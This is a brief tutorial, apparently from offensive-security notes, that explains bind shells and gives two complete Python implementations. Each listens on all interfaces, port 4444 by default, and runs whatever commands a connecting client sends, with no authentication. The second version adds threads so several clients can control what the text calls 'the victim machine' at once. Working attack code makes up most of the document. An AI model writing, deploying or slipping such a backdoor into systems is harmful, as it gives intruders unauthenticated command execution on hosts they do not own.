## Table of Contents

  - [Supporting Multiple Connections](#Supporting\Multiple\Connections)

A bind shell is a process that binds to an address and port on the host machine and then listsn for incoming connections to the socket. When a connection is made, the bind shell will repeatedly listen for bytes being sent to it and treat them as raw commands. Once it has received all bytes i chunks of some size, it will run the command on the host system and send back the output.

```python
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
```

- Downside of the current implementation is once the connection is dropped/shell process stops the  connection is fully lost. This  can be fixed through using `threads` and have the command execution part of the code run in a thread

To keep a very long and complicated story short and straightforward, threads let us run different code pieces `concurrently`, similarly to how humans multitask. Note that concurrently is not the same as parallel. In our example, this means that while one thread is busy doing work for our connected client, another thread (the primary one) is ready to accept a new incoming connection.
- Once another connection is made, these two connected clients can execute code on the victim machine using the same bind shell.


## Supporting Multiple Connections
```python
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
```









